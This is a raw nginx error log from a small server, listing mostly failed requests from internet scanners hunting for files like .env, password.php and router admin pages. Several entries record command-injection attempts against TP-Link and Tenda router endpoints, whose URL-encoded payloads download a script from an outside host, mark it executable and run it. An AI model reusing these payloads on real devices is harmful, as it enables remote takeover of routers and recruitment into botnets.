2024/04/17 08:34:17 [notice] 1#1: using the "epoll" event method
2024/04/17 08:34:17 [notice] 1#1: nginx/1.22.1
2024/04/17 08:34:17 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:34:17 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:34:17 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:34:17 [notice] 1#1: start worker processes
2024/04/17 08:34:17 [notice] 1#1: start worker process 29
2024/04/17 08:34:17 [notice] 1#1: start worker process 30
2024/04/17 08:43:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 08:43:54 [notice] 29#29: gracefully shutting down
2024/04/17 08:43:54 [notice] 30#30: gracefully shutting down
2024/04/17 08:43:54 [notice] 29#29: exiting
2024/04/17 08:43:54 [notice] 30#30: exiting
2024/04/17 08:43:54 [notice] 29#29: exit
2024/04/17 08:43:54 [notice] 30#30: exit
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 29
2024/04/17 08:43:54 [notice] 1#1: worker process 29 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: signal 29 (SIGIO) received
2024/04/17 08:43:54 [notice] 1#1: signal 17 (SIGCHLD) received from 30
2024/04/17 08:43:54 [notice] 1#1: worker process 30 exited with code 0
2024/04/17 08:43:54 [notice] 1#1: exit
2024/04/17 08:45:35 [notice] 1#1: using the "epoll" event method
2024/04/17 08:45:35 [notice] 1#1: nginx/1.22.1
2024/04/17 08:45:35 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 08:45:35 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 08:45:35 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 08:45:35 [notice] 1#1: start worker processes
2024/04/17 08:45:35 [notice] 1#1: start worker process 22
2024/04/17 08:45:35 [notice] 1#1: start worker process 23
2024/04/17 11:23:53 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
2024/04/17 11:23:53 [notice] 22#22: gracefully shutting down
2024/04/17 11:23:53 [notice] 22#22: exiting
2024/04/17 11:23:53 [notice] 22#22: exit
2024/04/17 11:23:53 [notice] 23#23: gracefully shutting down
2024/04/17 11:23:53 [notice] 23#23: exiting
2024/04/17 11:23:53 [notice] 23#23: exit
2024/04/17 11:23:53 [notice] 1#1: signal 17 (SIGCHLD) received from 22
2024/04/17 11:23:53 [notice] 1#1: worker process 22 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: worker process 23 exited with code 0
2024/04/17 11:23:53 [notice] 1#1: exit
2024/04/17 11:27:16 [notice] 1#1: using the "epoll" event method
2024/04/17 11:27:16 [notice] 1#1: nginx/1.22.1
2024/04/17 11:27:16 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
2024/04/17 11:27:16 [notice] 1#1: OS: Linux 3.10.0-1160.108.1.el7.x86_64
2024/04/17 11:27:16 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
2024/04/17 11:27:16 [notice] 1#1: start worker processes
2024/04/17 11:27:16 [notice] 1#1: start worker process 22
2024/04/17 11:27:16 [notice] 1#1: start worker process 23
2024/04/17 11:30:44 [error] 22#22: *1 directory index of "/usr/share/nginx/html/" is forbidden, client: 212.70.149.134, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 18:54:20 [error] 23#23: *258 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 18:54:24 [error] 23#23: *258 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 18:54:27 [error] 23#23: *258 directory index of "/usr/share/nginx/html/" is forbidden, client: 101.251.238.163, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 18:54:30 [error] 22#22: *259 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/19 18:54:33 [error] 22#22: *259 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 101.251.238.163, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/19 19:20:10 [error] 22#22: *260 directory index of "/usr/share/nginx/html/" is forbidden, client: 46.174.191.28, server: localhost, request: "GET / HTTP/1.0"
2024/04/19 19:40:39 [error] 22#22: *261 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.242.226.99, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 19:59:25 [error] 22#22: *262 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 20:36:53 [error] 22#22: *265 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 20:39:43 [error] 22#22: *266 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 117.252.34.182, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "8.148.22.188:80"
2024/04/19 20:44:38 [error] 22#22: *267 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 20:44:57 [error] 22#22: *269 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.179, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/19 21:28:57 [error] 22#22: *271 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 22:18:49 [error] 22#22: *272 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.33, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/19 22:50:46 [error] 22#22: *273 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.180.140.6, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/19 22:50:47 [error] 22#22: *274 open() "/usr/share/nginx/html/wp-content/plugins/kingcomposer/readme.txt" failed (2: No such file or directory), client: 185.180.140.6, server: localhost, request: "GET /wp-content/plugins/kingcomposer/readme.txt HTTP/1.1", host: "8.148.22.188"
2024/04/19 23:27:49 [error] 23#23: *276 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.177, server: localhost, request: "GET /.env HTTP/1.1", host: "8.148.22.188"
2024/04/20 00:05:04 [error] 23#23: *278 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 01:25:50 [error] 23#23: *279 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:50:22 [error] 23#23: *281 directory index of "/usr/share/nginx/html/" is forbidden, client: 199.45.154.21, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 01:50:29 [error] 23#23: *282 directory index of "/usr/share/nginx/html/" is forbidden, client: 199.45.154.21, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:52 [error] 23#23: *287 directory index of "/usr/share/nginx/html/" is forbidden, client: 134.209.25.233, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:53 [error] 23#23: *288 open() "/usr/share/nginx/html/form.html" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /form.html HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:54 [error] 23#23: *289 open() "/usr/share/nginx/html/upl.php" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /upl.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:55 [error] 22#22: *291 "/usr/share/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /geoip/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:56 [error] 22#22: *292 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:56 [error] 22#22: *293 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /1.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:57 [error] 22#22: *294 open() "/usr/share/nginx/html/bundle.js" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /bundle.js HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:58 [error] 22#22: *295 "/usr/share/nginx/html/files/index.html" is not found (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /files/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:58:58 [error] 22#22: *296 open() "/usr/share/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /systembc/password.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:59:00 [error] 22#22: *297 open() "/usr/share/nginx/html/password.php" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /password.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 01:59:00 [error] 22#22: *298 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 134.209.25.233, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 02:00:16 [error] 22#22: *299 directory index of "/usr/share/nginx/html/" is forbidden, client: 205.210.31.220, server: localhost, request: "GET / HTTP/1.0"
2024/04/20 02:27:28 [error] 22#22: *300 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.240.121.17, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 02:57:00 [error] 22#22: *303 open() "/usr/share/nginx/html/0bef" failed (2: No such file or directory), client: 172.105.77.209, server: localhost, request: "GET /0bef HTTP/1.0"
2024/04/20 03:36:40 [error] 22#22: *304 directory index of "/usr/share/nginx/html/" is forbidden, client: 64.62.197.160, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 03:37:33 [error] 22#22: *305 "/usr/share/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 64.62.197.155, server: localhost, request: "GET /webui/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 03:39:02 [error] 22#22: *306 "/usr/share/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 64.62.197.152, server: localhost, request: "GET /geoserver/web/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 04:27:44 [error] 23#23: *310 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 05:20:10 [error] 23#23: *311 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 05:32:00 [error] 23#23: *313 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 05:43:47 [error] 23#23: *314 directory index of "/usr/share/nginx/html/" is forbidden, client: 115.231.78.12, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 05:43:47 [error] 23#23: *315 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 05:43:47 [error] 23#23: *316 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 115.231.78.12, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 06:05:57 [error] 23#23: *317 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 06:14:10 [error] 23#23: *318 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.211.33, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 06:14:45 [error] 23#23: *319 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 06:59:12 [error] 23#23: *320 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 07:11:10 [error] 23#23: *321 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 07:20:14 [error] 23#23: *322 directory index of "/usr/share/nginx/html/" is forbidden, client: 98.96.193.42, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 07:20:16 [error] 22#22: *323 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 98.96.193.42, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 07:26:28 [error] 22#22: *324 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.203.211.150, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 07:36:43 [error] 22#22: *326 directory index of "/usr/share/nginx/html/" is forbidden, client: 46.174.191.30, server: localhost, request: "GET / HTTP/1.0"
2024/04/20 07:50:11 [error] 22#22: *327 directory index of "/usr/share/nginx/html/" is forbidden, client: 183.249.224.224, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 08:02:19 [error] 22#22: *328 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.32, server: localhost, request: "GET / HTTP/1.0"
2024/04/20 08:03:13 [error] 22#22: *329 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.191.126.213, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 08:32:47 [error] 22#22: *330 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.156.129.48, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 08:59:31 [error] 22#22: *331 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 09:34:46 [error] 22#22: *332 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 10:04:13 [error] 22#22: *333 directory index of "/usr/share/nginx/html/" is forbidden, client: 80.94.92.60, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 10:13:50 [error] 22#22: *334 directory index of "/usr/share/nginx/html/" is forbidden, client: 35.216.238.182, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 10:14:09 [error] 22#22: *335 directory index of "/usr/share/nginx/html/" is forbidden, client: 117.235.69.211, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 10:41:29 [error] 22#22: *337 open() "/usr/share/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "8.148.22.188", referrer: "https://8.148.22.188"
2024/04/20 10:49:26 [error] 22#22: *338 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 10:51:51 [error] 23#23: *339 open() "/usr/share/nginx/html/Kvsh/login/index_main.php" failed (2: No such file or directory), client: 67.217.48.178, server: localhost, request: "POST /Kvsh/login/index_main.php HTTP/1.1", host: "unique-li.club"
2024/04/20 11:23:20 [error] 23#23: *340 directory index of "/usr/share/nginx/html/" is forbidden, client: 185.224.128.43, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 11:46:15 [error] 23#23: *341 open() "/usr/share/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "8.148.22.188", referrer: "https://8.148.22.188"
2024/04/20 12:43:13 [error] 23#23: *344 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.142.182.118, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 13:53:52 [error] 23#23: *346 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3Bcd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 13:53:52 [error] 23#23: *346 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 80.94.92.60, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3Bcd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 14:16:14 [error] 23#23: *348 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.236.251.77, server: localhost, request: "GET http://passport.baidu.com/ HTTP/1.1", host: "passport.baidu.com:80"
2024/04/20 14:20:13 [error] 23#23: *350 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 14:31:42 [error] 23#23: *351 open() "/usr/share/nginx/html/mailman/listinfo/mailman" failed (2: No such file or directory), client: 179.43.191.18, server: localhost, request: "GET /mailman/listinfo/mailman HTTP/1.1", host: "8.148.22.188"
2024/04/20 14:35:37 [error] 23#23: *352 directory index of "/usr/share/nginx/html/" is forbidden, client: 162.243.151.8, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 14:52:25 [error] 23#23: *353 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.18, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 14:52:25 [error] 23#23: *353 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.18, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 15:46:16 [error] 23#23: *354 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.69, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:01 [error] 22#22: *357 directory index of "/usr/share/nginx/html/" is forbidden, client: 137.184.169.130, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:01 [error] 22#22: *358 open() "/usr/share/nginx/html/form.html" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /form.html HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:02 [error] 22#22: *359 open() "/usr/share/nginx/html/upl.php" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /upl.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:02 [error] 22#22: *361 "/usr/share/nginx/html/geoip/index.html" is not found (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /geoip/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:04 [error] 22#22: *362 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:04 [error] 22#22: *363 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /1.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:05 [error] 22#22: *364 open() "/usr/share/nginx/html/bundle.js" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /bundle.js HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:05 [error] 22#22: *365 "/usr/share/nginx/html/files/index.html" is not found (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /files/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:06 [error] 22#22: *366 open() "/usr/share/nginx/html/systembc/password.php" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /systembc/password.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:06 [error] 22#22: *367 open() "/usr/share/nginx/html/password.php" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /password.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:27:07 [error] 22#22: *368 open() "/usr/share/nginx/html/info.php" failed (2: No such file or directory), client: 137.184.169.130, server: localhost, request: "GET /info.php HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:34:39 [error] 22#22: *369 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 46.8.43.78, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "8.148.22.188:80", referrer: "http://8.148.22.188:80/admin/login.asp"
2024/04/20 16:52:21 [error] 23#23: *371 open() "/usr/share/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 120.86.254.77, server: localhost, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2024/04/20 16:52:30 [error] 23#23: *372 directory index of "/usr/share/nginx/html/" is forbidden, client: 47.236.251.77, server: localhost, request: "GET http://passport.baidu.com/ HTTP/1.1", host: "passport.baidu.com:80"
2024/04/20 16:53:41 [error] 23#23: *377 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.17, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 16:53:41 [error] 23#23: *377 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.17, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 17:29:26 [error] 23#23: *378 open() "/usr/share/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: localhost, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 17:39:44 [error] 23#23: *379 directory index of "/usr/share/nginx/html/" is forbidden, client: 123.160.221.142, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 17:46:16 [error] 23#23: *380 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.188.44, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 17:58:59 [error] 23#23: *381 directory index of "/usr/share/nginx/html/" is forbidden, client: 45.83.66.81, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 17:59:01 [error] 23#23: *382 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 45.83.66.58, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 18:51:18 [error] 23#23: *383 directory index of "/usr/share/nginx/html/" is forbidden, client: 103.156.56.66, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 19:26:45 [error] 23#23: *384 "/usr/share/nginx/html/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/index.html" is not found (2: No such file or directory), client: 2.57.122.161, server: localhost, request: "GET /3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/3/ HTTP/1.1", host: "8.148.22.188"
2024/04/20 19:58:48 [error] 22#22: *387 directory index of "/usr/share/nginx/html/" is forbidden, client: 198.235.24.107, server: localhost, request: "GET / HTTP/1.0"
2024/04/20 20:39:34 [error] 22#22: *389 directory index of "/usr/share/nginx/html/" is forbidden, client: 118.26.39.151, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188:80"
2024/04/20 21:06:58 [error] 22#22: *390 directory index of "/usr/share/nginx/html/" is forbidden, client: 219.82.2.110, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 21:06:58 [error] 22#22: *390 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 219.82.2.110, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
2024/04/20 21:47:34 [error] 22#22: *392 directory index of "/usr/share/nginx/html/" is forbidden, client: 113.215.189.62, server: localhost, request: "GET / HTTP/1.1", host: "8.148.22.188"
2024/04/20 21:47:34 [error] 22#22: *392 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 113.215.189.62, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "8.148.22.188"
